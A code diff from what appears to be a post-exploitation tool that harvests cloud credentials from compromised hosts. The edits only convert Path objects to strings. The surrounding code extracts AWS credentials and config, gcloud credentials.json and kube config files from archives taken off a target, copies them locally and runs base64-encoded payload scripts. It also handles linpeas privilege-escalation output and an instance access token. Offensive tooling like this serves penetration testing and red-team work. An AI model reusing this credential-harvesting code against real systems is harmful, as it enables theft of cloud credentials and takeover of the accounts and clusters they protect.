@@ -251,8 +251,8 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     for m in file.members:
                         if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
                             file.extract(m.path, task_path)
-                            shutil.copy2(Path.joinpath(
-                                task_path, m.path), Path.joinpath(aws_dir, os.path.basename(m.path)))
+                            shutil.copy2(str(Path.joinpath(
+                                task_path, m.path)), str(Path.joinpath(aws_dir, Path(os.path.basename(m.path)))))
 
                     payload = base64.b64encode(
                         f'aws configure list-profiles'.encode('utf-8'))
@@ -284,15 +284,15 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     for m in file.members:
                         if m.isfile() and (m.path.endswith('/.config/gcloud/credentials.json')):
                             file.extract(m.path, task_path)
-                            shutil.copy2(Path.joinpath(
-                                task_path, m.path), Path.joinpath(gcp_dir, os.path.basename(m.path)))
+                            shutil.copy2(str(Path.joinpath(
+                                task_path, m.path)), str(Path.joinpath(gcp_dir, Path(os.path.basename(m.path)))))
 
                 # copy our payload to the local working directory
                 task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                 shutil.copy2(task_script, task_path)
 
                 # copy linpeas.txt into our working directory
-                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
+                linpeas = str(Path(f'/tmp/{hostname}_linpeas.txt'))
                 shutil.copy2(linpeas, task_path)
 
                 # extract the kube config if they exist
@@ -305,8 +305,8 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     for m in file.members:
                         if m.isfile() and (m.path.endswith('/.kube/config')):
                             file.extract(m.path, task_path)
-                            shutil.copy2(Path.joinpath(
-                                task_path, m.path), Path.joinpath(kube_dir, os.path.basename(m.path)))
+                            shutil.copy2(str(Path.joinpath(
+                                task_path, m.path)), str(Path.joinpath(kube_dir, Path(os.path.basename(m.path)))))
 
             # get hostname for disk loggings
             hostname = session.platform.getenv('HOSTNAME')
@@ -462,7 +462,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                 shutil.copy2(task_script, task_path)
 
-                with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'rb') as f:
+                with open(str(Path.joinpath(task_path, Path(f"{task_name}.sh"))), 'rb') as f:
                     payload = base64.b64encode(f.read())
 
                 session.log("running scan payload...")
@@ -486,8 +486,8 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 for m in file.members:
                     if m.isfile():
                         file.extract(m.path, task_path)
-                        shutil.copy2(Path.joinpath(
-                            task_path, m.path), Path.joinpath("/tmp", os.path.basename(m.path)))
+                        shutil.copy2(str(Path.joinpath(
+                            task_path, m.path)), str(Path.joinpath(Path("/tmp"), Path(os.path.basename(m.path)))))
             else:
                 # update to add 15 minute timeout
                 result = session.platform.run(
